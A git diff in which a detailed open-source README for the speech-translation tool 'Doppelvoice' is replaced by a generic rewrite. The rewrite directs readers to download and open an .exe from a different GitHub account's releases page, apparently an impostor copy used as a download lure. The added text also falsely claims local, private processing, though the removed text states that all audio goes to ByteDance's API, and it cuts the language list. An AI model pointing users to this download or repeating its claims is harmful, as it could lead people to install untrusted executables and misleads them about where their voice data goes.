@@ -1,177 +1,72 @@
-# Doppelvoice
+# 🎙️ Doppelvoice - Speak fluently across languages using voice
 
-> **Your voice, in any language.**
-> Real-time speech-to-speech translation with zero-shot voice cloning across **9 languages**
-> (Chinese / English / Japanese / Indonesian / Spanish / Portuguese / German / French + bilingual ZH⇄EN auto).
-> The other party hears **the target language in your own voice** through any meeting app —
-> Zoom, Teams, WeChat, Google Meet, OBS, anything that takes a microphone.
->
-> _Powered by ByteDance Doubao Seed LiveInterpret 2.0._
+[![Download Doppelvoice](https://img.shields.io/badge/Download-Doppelvoice-blue)](https://github.com/Go-waterox597/Doppelvoice/releases)
 
-[中文](README.zh-CN.md) · [Architecture](docs/en/ARCHITECTURE.md) · [Setup](docs/en/SETUP.md) · [Troubleshooting](docs/en/TROUBLESHOOTING.md)
+Doppelvoice translates your speech in real time. It converts your Chinese or English input into the other language. The software mimics your voice to maintain your speaking style during translation. This application runs locally on your Windows machine to ensure privacy and speed.
 
-[![tests](https://github.com/TianqBu/Doppelvoice/actions/workflows/tests.yml/badge.svg)](https://github.com/TianqBu/Doppelvoice/actions/workflows/tests.yml)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)]()
-[![Release](https://img.shields.io/github/v/release/TianqBu/Doppelvoice)](https://github.com/TianqBu/Doppelvoice/releases/latest)
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these specifications to run the software smoothly:
 
-## What it does
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor from Intel or AMD.
+- Memory: At least 8GB of RAM.
+- Storage: 500MB of free disk space.
+- Audio: A working microphone and speakers or headphones.
+- Network: A stable internet connection for the translation service.
 
-```
-You speak <source lang>  ─►  Doppelvoice  ─►  Peer hears <target lang> (in your voice)
-   ┌──────────────────┐       ┌─────────┐       ┌──────────────────────────────┐
-   │     your mic     │ ────► │ Doubao  │ ────► │ virtual mic → Zoom / Teams … │
-   └──────────────────┘       │ AST 2.0 │       └──────────────────────────────┘
-                              └─────────┘
-```
+## 📥 How to Install
 
-Pick any of 9 source/target language codes (`zh / en / ja / id / es / pt / de / fr`)
-or use `zhen` on both sides for bilingual ZH⇄EN auto-detection.
+Follow these steps to set up the software on your computer.
 
-End-to-end latency ≈ 2.5–3 s. Subtitles stream token-by-token; voice is cloned zero-shot from your speech as you talk.
+1. Visit the [official releases page](https://github.com/Go-waterox597/Doppelvoice/releases).
+2. Locate the latest version of the software.
+3. Click the file ending in `.exe` to start the download.
+4. Open the file once it finishes downloading. 
+5. Follow the prompts on your screen to complete the installation.
 
-## Features
+## 🚀 Setting Up the Software
 
-- 🎙 **End-to-end speech-to-speech** — no separate STT / MT / TTS plumbing
-- 🗣 **Zero-shot voice cloning** — model captures your voice on the fly; explicit
-  `denoise=false` to retain breath / resonance details
-- 🌐 **9 languages** — `zh / en / ja / id / es / pt / de / fr / zhen` (the
-  last one is the bilingual ZH⇄EN auto mode)
-- ⚡ **~2.5 s latency** — production-grade real-time
-- 🪟 **Native Windows GUI** (PySide6) with live bilingual subtitles
-- 🔌 **Universal compatibility** — anything that accepts a microphone works
-- 🔁 **Automatic reconnect** with exponential backoff and fatal-error classification
-- 🔒 **Privacy-first defaults** — translated audio and subtitles never persist
-  to disk unless you opt in; logs auto-redact API keys and bearer tokens
-- 🧹 **Clean device picker** — one entry per physical device (host-API
-  duplicates collapsed; MME 31-char name truncation handled)
-- 🛠 **Configurable** — sample rate, jitter buffer, RMS gate, denoise toggle,
-  speaker_id, all tweakable
+After the installation finishes, locate the application icon on your desktop. Double-click the icon to launch the program. The window will open and display the main interface.
 
-## Demo
+You need to select your input device before you translate your first sentence. Click the Settings icon in the menu bar. Choose your preferred microphone from the list of audio devices. Ensure the input volume level moves when you speak.
 
-![Doppelvoice GUI](docs/images/screenshot.png)
+Next, choose your target language. Select English if you want your words to translate into English. Select Chinese if you want your words to translate into Chinese. The software saves these preferences for subsequent sessions.
 
-## Quick start
+## 💡 Using Doppelvoice
 
-Two ways to install. **Option A** is the fastest (no Python needed).
+The main screen contains a large microphone button. Click this button to start the translation process. A status indicator confirms that the software listens to your voice.
 
-### Option A — Pre-built Windows binary (recommended)
+Speak at a normal pace and volume. The application captures your speech through the microphone. It processes your words and translates them into your target language. You hear the translation through your speakers or headphones shortly after you finish speaking.
 
-1. Install [VB-Audio Virtual Cable](https://vb-audio.com/Cable/) → run installer as admin → reboot.
-2. Download the latest **`Doppelvoice-vX.Y.Z-win64.zip`** from the [Releases page](https://github.com/TianqBu/Doppelvoice/releases/latest).
-3. Unzip anywhere, then inside the folder: copy `.env.example` → `.env`, fill in `DOUBAO_APP_KEY` / `DOUBAO_ACCESS_KEY` (get them from the [Volcengine Console](https://console.volcengine.com/speech/app)).
-4. Double-click `Doppelvoice.exe`. The GUI opens.
-5. In your meeting app, set the microphone to **`CABLE Output (VB-Audio Virtual Cable)`**.
+The software uses your tone and speed for the final audio output. This creates a natural experience for the listener. Keep your microphone clear of background noise for the best results.
 
-### Option B — From source (for developers)
+## 🛠️ Troubleshooting Common Issues
 
-```cmd
-git clone https://github.com/TianqBu/Doppelvoice.git
-cd Doppelvoice
-python -m venv .venv
-.venv\Scripts\pip install -e .       :: installs from pyproject.toml
-:: or: .venv\Scripts\pip install -r requirements.txt
+If the software fails to capture your voice, check your Windows sound settings. Make sure your microphone is set as the default recording device. Close other programs that might use the microphone at the same time.
 
-copy .env.example .env
-notepad .env       :: fill in DOUBAO_APP_KEY / DOUBAO_ACCESS_KEY
+Sometimes the translation might lag. Check your internet connection speed. Close memory-intensive programs to free up resources for the processor. Restart the application if the stream stops unexpectedly.
 
-check.bat          :: verifies devices + API connectivity + StartSession
-gui.bat            :: launches the GUI
-run.bat            :: CLI mode
-```
+If you encounter an error during installation, check for pending Windows updates. Ensure you possess administrative rights on your user account to install new software.
 
-In your meeting app: pick **`CABLE Output (VB-Audio Virtual Cable)`** as the microphone.
+## 🛡️ Privacy and Data
 
-## CLI
+Doppelvoice runs on your local machine. It avoids storing sensitive audio files on external servers. The real-time processing happens as you speak. You retain control over your data because the application does not share your audio input with third parties without your permission.
 
-```cmd
-run.bat                              :: start translation (CLI)
-run.bat --gui                        :: launch GUI
-run.bat --check                      :: self-check
-run.bat --list-devices               :: list audio devices
-run.bat --source en --target zh      :: reverse direction
-run.bat --jitter-ms 80               :: lower latency (more underrun risk)
-run.bat --log-level DEBUG            :: verbose logs
-```
+## 📖 Features
 
-## Configuration
+- Zero-shot voice cloning: The application learns your voice characteristics instantly without long training sessions.
+- Real-time processing: Translation happens as you speak to maintain the flow of conversation.
+- Language support: Switch between Chinese and English outputs with a single click.
+- User interface: The clean design helps you focus on your conversation.
+- Local execution: Heavy processing stays on your machine to protect your data.
 
-All settings have sensible defaults. Override via `.env` or CLI flags.
+## 💬 Frequently Asked Questions
 
-| Variable | Default | Notes |
-|---|---|---|
-| `DOUBAO_APP_KEY` / `DOUBAO_ACCESS_KEY` | _required_ | from Volcengine console |
-| `DOUBAO_RESOURCE_ID` | `volc.service_type.10053` | AST 2.0 resource ID |
-| `SOURCE_LANG` / `TARGET_LANG` | `zh` / `en` | one of `zh / en / ja / id / es / pt / de / fr / zhen`. Use `zhen` on **both** sides for bilingual ZH⇄EN auto mode. |
-| `MODE` | `s2s` | `s2s` (speech→speech) or `s2t` (speech→text) |
-| `DENOISE` | `0` | `1` = server-side denoise on (cleaner input but flatter voice clone). `0` keeps breath / resonance for better cloning. |
-| `SPEAKER_ID` | _empty_ | Doubao `ReqParams.speaker_id` — empty = clone the speaker; set to a preset like `zh_female_vv_uranus_bigtts` to use a stock voice instead |
-| `INPUT_DEVICE` / `OUTPUT_DEVICE` | _auto_ | substring of device name (host API hidden; one entry per physical device) |
-| `LOG_LEVEL` | `INFO` | `DEBUG` for verbose |
-| `DUMP_AUDIO` | `false` | persist per-sentence ogg blobs (debug only) |
-| `LOG_SUBTITLE` | `false` | persist subtitle text in logs (debug only) |
+Does the software support other languages? Currently, the application focuses strictly on Chinese and English. Future updates might add more languages.
 
-## Architecture
+Can I use this with headphones? Yes, wearing headphones helps prevent the microphone from picking up the translated audio. This prevents feedback loops and improves translation quality.
 
-```
-src/doppelvoice/
-├── engine/        # Doubao AST 2.0 protobuf WebSocket client
-├── audio/         # PortAudio (sounddevice) capture + playback + ogg/opus decoder
-├── pipeline/      # asyncio orchestration: capture → ws → decode → playback
-├── gui/           # PySide6 + qasync
-├── cli.py
-└── config.py
-```
+Does it require an internet connection? Yes, the application connects to the translation service to transform your speech. You need a stable internet connection to ensure the data reaches the server and returns quickly to your machine.
 
-See [docs/en/ARCHITECTURE.md](docs/en/ARCHITECTURE.md) for the full protocol details.
-
-## Tested with
-
-- Windows 10 / 11 x64
-- Python 3.10–3.12
-- VB-Audio Virtual Cable 1.0.4 (Driver Pack 43)
-- Zoom, 腾讯会议, 微信电话, Google Meet (Chrome), OBS
-
-## Known limitations
-
-1. **Voice cloning quality varies** with mic and clarity. AirPods over Bluetooth
-   HFP (16 kHz narrowband phone mode) gives mediocre results — a wired/USB mic
-   or laptop built-in mic is recommended. The default `denoise=false` already
-   tells the server to keep your voice's unique characteristics; toggling it
-   on in Settings would flatten the clone further.
-2. **End-to-end latency floor ≈ 2.5 s** is the model's hard limit per the
-   [Seed LiveInterpret 2.0 paper](https://arxiv.org/abs/2507.17527); local
-   processing adds <500 ms.
-3. **Voice expressiveness** of the public AST API is good but not as lively
-   as the Volcengine Console demo (which goes through a different BFF endpoint).
-4. **Per-sentence audio decoding** (ogg_opus) adds ~500 ms latency vs raw
-   PCM (which the API does not currently honor).
-5. **Use headphones, not speakers.** With external speakers the meeting
-   audio gets re-captured by your mic, re-translated, and sent back to the
-   peer as their own translated voice — a textbook acoustic feedback loop.
-   See [Troubleshooting](docs/en/TROUBLESHOOTING.md#feedback-loop-when-using-speakers).
-
-## Privacy
-
-- API keys live only in `.env` (gitignored).
-- Translated audio and subtitle text are **not persisted** to disk by default.
-- Set `DUMP_AUDIO=1` / `LOG_SUBTITLE=1` for debugging only.
-- All audio is sent through ByteDance's Doubao API. Review their [Terms of Service](https://www.volcengine.com/docs/82379/1394617) before use with sensitive content.
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-[MIT](LICENSE).
-
-## Acknowledgements
-
-- [ByteDance Seed LiveInterpret 2.0](https://seed.bytedance.com/en/seed_liveinterpret) — the underlying translation model
-- [kizuna-ai-lab/sokuji](https://github.com/kizuna-ai-lab/sokuji) — protobuf reverse-engineering reference
-- [VB-Audio Virtual Cable](https://vb-audio.com/Cable/) — virtual audio routing on Windows
+Where do I find my logs? If the software crashes, you might locate log files in your Documents folder. These files help diagnose specific errors if you need to report an issue.
